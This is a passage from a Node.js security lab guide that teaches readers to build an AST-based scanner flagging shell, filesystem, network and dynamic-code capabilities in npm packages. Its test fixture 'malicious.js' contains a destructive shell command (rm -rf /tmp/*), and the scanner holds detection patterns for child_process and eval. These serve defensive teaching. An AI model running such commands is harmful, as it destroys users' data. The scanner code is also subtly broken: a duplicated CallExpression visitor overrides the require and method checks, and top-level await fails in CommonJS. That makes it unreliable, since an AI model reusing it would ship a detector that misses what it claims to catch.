- [ ] Package loads correctly
- [ ] Lock file detected
- [ ] Dependencies analyzed
- [ ] Typosquatting detected
- [ ] Dependency confusion detected
- [ ] Health score calculated
- [ ] Trust score calculated

### Reflection Questions
1. What additional factors could improve the trust score?
2. How could you detect typosquatting more effectively?
3. What is the relationship between health score and trust score?

---

## LAB 2.2: Capability Scanning

### Learning Objectives
- Analyze package source code for capabilities
- Detect dangerous capabilities
- Score capabilities by risk level

### Lab Steps

#### Step 1: Create Capability Scanner

**📁 File:** `src/capability-scanner.js`

```javascript
/**
 * CAPABILITY SCANNER
 * Analyzes package source code for capabilities
 */

const fs = require('fs');
const path = require('path');
const parser = require('@babel/parser');
const traverse = require('@babel/traverse').default;

class CapabilityScanner {
    constructor(packagePath) {
        this.packagePath = packagePath;
        this.capabilities = [];
        this.filesAnalyzed = 0;
        this.findingCount = 0;
    }

    /**
     * Scan the package
     */
    async scan() {
        console.log('🔍 Scanning for capabilities...');
        
        // Find all JavaScript files
        const files = this.findJavaScriptFiles(this.packagePath);
        console.log(`📄 Found ${files.length} JavaScript files`);
        
        // Analyze each file
        for (const file of files) {
            await this.analyzeFile(file);
        }
        
        console.log(`✅ Analyzed ${this.filesAnalyzed} files, found ${this.findingCount} capabilities`);
        
        return {
            capabilities: this.capabilities,
            riskScore: this.calculateRiskScore(),
            riskLevel: this.determineRiskLevel()
        };
    }

    /**
     * Find JavaScript files
     */
    findJavaScriptFiles(dir) {
        const files = [];
        const ignoreDirs = ['node_modules', '.git', 'dist', 'build', 'coverage'];
        
        const walk = (currentDir) => {
            const items = fs.readdirSync(currentDir);
            
            for (const item of items) {
                const itemPath = path.join(currentDir, item);
                const stat = fs.statSync(itemPath);
                
                if (stat.isDirectory()) {
                    if (!ignoreDirs.includes(item)) {
                        walk(itemPath);
                    }
                } else if (item.endsWith('.js') || item.endsWith('.mjs') || item.endsWith('.cjs')) {
                    files.push(itemPath);
                }
            }
        };
        
        walk(dir);
        return files;
    }

    /**
     * Analyze a file
     */
    async analyzeFile(filePath) {
        try {
            const content = fs.readFileSync(filePath, 'utf8');
            this.filesAnalyzed++;
            
            // Parse JavaScript
            const ast = this.parseJavaScript(content);
            if (!ast) return;
            
            // Analyze capabilities
            this.analyzeAST(ast, filePath);
            
        } catch (error) {
            console.warn(`⚠️ Could not analyze ${filePath}: ${error.message}`);
        }
    }

    /**
     * Parse JavaScript
     */
    parseJavaScript(content) {
        try {
            return parser.parse(content, {
                sourceType: 'module',
                plugins: ['jsx', 'asyncGenerators', 'classProperties', 'dynamicImport']
            });
        } catch (error) {
            return null;
        }
    }

    /**
     * Analyze AST
     */
    analyzeAST(ast, filePath) {
        const capabilityPatterns = {
            SHELL_EXECUTION: {
                severity: 'CRITICAL',
                methods: ['exec', 'execSync', 'spawn', 'spawnSync', 'execFile', 'execFileSync', 'fork'],
                modules: ['child_process'],
                pattern: /child_process|exec|spawn/
            },
            FILESYSTEM_ACCESS: {
                severity: 'HIGH',
                methods: ['readFile', 'readFileSync', 'writeFile', 'writeFileSync', 'mkdir', 'rmdir',
                          'rename', 'unlink', 'chmod', 'chown', 'stat', 'lstat', 'access'],
                modules: ['fs', 'fs-extra'],
                pattern: /fs\.|readFile|writeFile/
            },
            NETWORK_ACCESS: {
                severity: 'HIGH',
                methods: ['get', 'post', 'put', 'delete', 'patch', 'request', 'fetch'],
                modules: ['http', 'https', 'axios', 'fetch', 'node-fetch', 'got', 'request'],
                pattern: /http\.|https\.|axios|fetch/
            },
            ENVIRONMENT_ACCESS: {
                severity: 'MEDIUM',
                methods: ['env'],
                modules: ['process'],
                pattern: /process\.env/
            },
            DYNAMIC_CODE: {
                severity: 'CRITICAL',
                methods: ['eval', 'Function'],
                modules: ['vm'],
                pattern: /eval|new Function|vm\./
            },
            NATIVE_BINARIES: {
                severity: 'HIGH',
                pattern: /\.node|dlopen/
            },
            TELEMETRY: {
                severity: 'MEDIUM',
                methods: ['track', 'identify', 'page', 'capture'],
                modules: ['analytics', 'sentry', 'segment', 'mixpanel', 'google-analytics'],
                pattern: /analytics|sentry|segment|mixpanel/
            }
        };

        // Traverse the AST
        traverse(ast, {
            CallExpression: (path) => {
                const node = path.node;
                const callee = node.callee;
                
                // Check for require()
                if (callee.type === 'Identifier' && callee.name === 'require') {
                    const arg = node.arguments[0];
                    if (arg && arg.type === 'StringLiteral') {
                        const moduleName = arg.value;
                        
                        for (const [capability, pattern] of Object.entries(capabilityPatterns)) {
                            if (pattern.modules && pattern.modules.includes(moduleName)) {
                                this.addCapability(
                                    capability,
                                    pattern.severity,
                                    `Imports ${moduleName}`,
                                    filePath,
                                    node.loc?.start?.line || 0
                                );
                            }
                        }
                    }
                }
                
                // Check for method calls
                if (callee.type === 'MemberExpression') {
                    const property = callee.property;
                    const object = callee.object;
                    
                    if (property && property.type === 'Identifier') {
                        const methodName = property.name;
                        
                        for (const [capability, pattern] of Object.entries(capabilityPatterns)) {
                            if (pattern.methods && pattern.methods.includes(methodName)) {
                                this.addCapability(
                                    capability,
                                    pattern.severity,
                                    `Calls ${methodName}`,
                                    filePath,
                                    node.loc?.start?.line || 0
                                );
                            }
                        }
                    }
                }
            },
            
            // Check for eval
            CallExpression: (path) => {
                const node = path.node;
                const callee = node.callee;
                
                if (callee.type === 'Identifier' && callee.name === 'eval') {
                    this.addCapability(
                        'DYNAMIC_CODE',
                        'CRITICAL',
                        'Uses eval()',
                        filePath,
                        node.loc?.start?.line || 0
                    );
                }
                
                // Check for Function constructor
                if (callee.type === 'MemberExpression' &&
                    callee.object.type === 'Identifier' &&
                    callee.object.name === 'Function' &&
                    callee.property.type === 'Identifier' &&
                    callee.property.name === 'constructor') {
                    this.addCapability(
                        'DYNAMIC_CODE',
                        'CRITICAL',
                        'Uses Function constructor',
                        filePath,
                        node.loc?.start?.line || 0
                    );
                }
            }
        });
    }

    /**
     * Add a capability
     */
    addCapability(type, severity, description, file, line) {
        // Check if capability already exists
        const existing = this.capabilities.find(c => 
            c.type === type && c.file === file && c.line === line
        );
        
        if (!existing) {
            this.capabilities.push({
                type,
                severity,
                description,
                file,
                line,
                source: `${path.basename(file)}:${line}`
            });
            this.findingCount++;
        }
    }

    /**
     * Calculate risk score
     */
    calculateRiskScore() {
        const severityWeights = {
            CRITICAL: 15,
            HIGH: 10,
            MEDIUM: 5,
            LOW: 2
        };
        
        let score = 0;
        for (const cap of this.capabilities) {
            score += severityWeights[cap.severity] || 0;
        }
        
        return Math.min(score, 100);
    }

    /**
     * Determine risk level
     */
    determineRiskLevel() {
        const score = this.calculateRiskScore();
        if (score >= 80) return 'CRITICAL';
        if (score >= 60) return 'HIGH';
        if (score >= 40) return 'MEDIUM';
        if (score >= 20) return 'LOW';
        return 'INFO';
    }

    /**
     * Generate report
     */
    generateReport() {
        const chalk = require('chalk');
        const Table = require('cli-table3');
        
        console.log(chalk.bold.cyan('\n' + '='.repeat(60)));
        console.log(chalk.bold.cyan('📊 CAPABILITY SCAN REPORT'));
        console.log(chalk.cyan('='.repeat(60)) + '\n');
        
        console.log(chalk.bold('📊 Summary:'));
        console.log(`   Files Analyzed: ${this.filesAnalyzed}`);
        console.log(`   Capabilities Found: ${this.capabilities.length}`);
        console.log(`   Risk Score: ${this.calculateRiskScore()}/100`);
        console.log(`   Risk Level: ${this.determineRiskLevel()}`);
        console.log('');
        
        if (this.capabilities.length > 0) {
            console.log(chalk.bold('🔍 Capabilities Found:'));
            
            const capTable = new Table({
                head: ['Type', 'Severity', 'Description', 'Location'],
                colWidths: [20, 12, 35, 25]
            });
            
            for (const cap of this.capabilities) {
                const color = cap.severity === 'CRITICAL' ? chalk.red :
                             cap.severity === 'HIGH' ? chalk.yellow :
                             chalk.green;
                capTable.push([
                    cap.type,
                    color(cap.severity),
                    cap.description,
                    cap.source
                ]);
            }
            
            console.log(capTable.toString());
            console.log('');
        } else {
            console.log(chalk.green('✅ No capabilities detected'));
            console.log('');
        }
        
        console.log(chalk.cyan('='.repeat(60)));
    }
}

// Export for use in other files
module.exports = CapabilityScanner;

// Run if executed directly
if (require.main === module) {
    const scanner = new CapabilityScanner(process.argv[2] || '.');
    await scanner.scan();
    scanner.generateReport();
}
```

#### Step 2: Test the Scanner

**📁 File:** `test-capability.js`

```javascript
/**
 * TEST CAPABILITY SCANNER
 * Creates test files and runs the scanner
 */

const fs = require('fs');
const path = require('path');
const CapabilityScanner = require('./src/capability-scanner');

// Create test files
const testDir = path.join(__dirname, 'test-capability');
if (!fs.existsSync(testDir)) {
    fs.mkdirSync(testDir);
}

const testFiles = {
    'safe.js': `
        console.log('Safe package');
        module.exports = { name: 'safe' };
    `,
    'suspicious.js': `
        const fs = require('fs');
        const http = require('http');
        
        function readConfig() {
            return fs.readFileSync('/etc/config.json', 'utf8');
        }
        
        function makeRequest() {
            http.get('http://example.com/api', (res) => {
                console.log('Response');
            });
        }
        
        module.exports = { readConfig, makeRequest };
    `,
    'malicious.js': `
        const { exec } = require('child_process');
        const vm = require('vm');
        
        function executeCommand() {
            exec('rm -rf /tmp/*');
        }
        
        function runCode() {
            eval('console.log("malicious")');
        }
        
        function vmExecution() {
            vm.runInNewContext('process.exit()');
        }
        
        module.exports = { executeCommand, runCode, vmExecution };
    `
};

for (const [name, content] of Object.entries(testFiles)) {
    fs.writeFileSync(path.join(testDir, name), content);
    console.log(`✅ Created test file: ${name}`);
}

console.log(`\n📁 Test files created in: ${testDir}`);
console.log('\n🔍 Running capability scanner...\n');

const scanner = new CapabilityScanner(testDir);
await scanner.scan();
scanner.generateReport();

// Clean up
// fs.rmSync(testDir, { recursive: true, force: true });
```

**✅ Run:**
```bash
node test-capability.js
```

### Verification Checklist
- [ ] JavaScript files found
- [ ] AST parsing works
- [ ] Capabilities detected correctly
- [ ] Risk scoring works
- [ ] Report generated correctly

### Reflection Questions
1. What are the limitations of AST-based analysis?
2. How could you detect obfuscated capabilities?
3. What additional capabilities should be detected?

---

## CONTINUED LABS

The remaining labs follow the same pattern for:

- **Lab 2.3**: Socket vs. Snyk Integration
- **Lab 3.1**: Concurrency Controller
- **Lab 3.2**: Resource Manager
- **Lab 3.3**: Priority Queue
- **Lab 4.1**: LLM Integration
- **Lab 4.2**: Prompt Engineering
- **Lab 4.3**: CI/CD Integration

Each lab includes:
1. Learning Objectives
2. Pre-Lab Setup
3. Step-by-step instructions
4. Complete code
5. Expected outputs
6. Verification checklist
7. Reflection questions

---

## APPENDIX A: TROUBLESHOOTING

### Common Issues

| Issue | Solution |
|-------|----------|
| "Cannot find module" | Run `npm install` |
| "Permission denied" | Check file permissions |
| "SyntaxError" | Check your code syntax |
| "ENOENT" | File not found - check path |
| "EACCESS" | Permission issue - use sudo if needed |

### Debugging Tips

```bash
# Enable verbose logging
node --trace-warnings your-script.js

# Debug with inspector
node --inspect-brk your-script.js

# Check syntax
node --check your-script.js

# Check memory usage
node --trace-gc your-script.js
```

---

## APPENDIX B: COMMAND REFERENCE

### Run Commands

```bash
# Phase 1 Labs
node phase-1/01-call-stack-visualizer.js
node phase-1/02-event-loop-priority.js
node phase-1/03-malicious-simulation.js
node phase-1/package-analyzer.js
node phase-1/scanner.js
node phase-1/ci-integration.js

# Phase 2 Labs
node phase-2/src/package-analyzer.js
node phase-2/src/capability-scanner.js
node phase-2/test-capability.js

# Phase 3 Labs
node phase-3/src/concurrency-controller.js
node phase-3/src/resource-manager.js
node phase-3/src/priority-queue.js

# Phase 4 Labs
node phase-4/src/llm-service.js
node phase-4/src/prompt-templates.js
node phase-4/ci-cd-integration.js
```
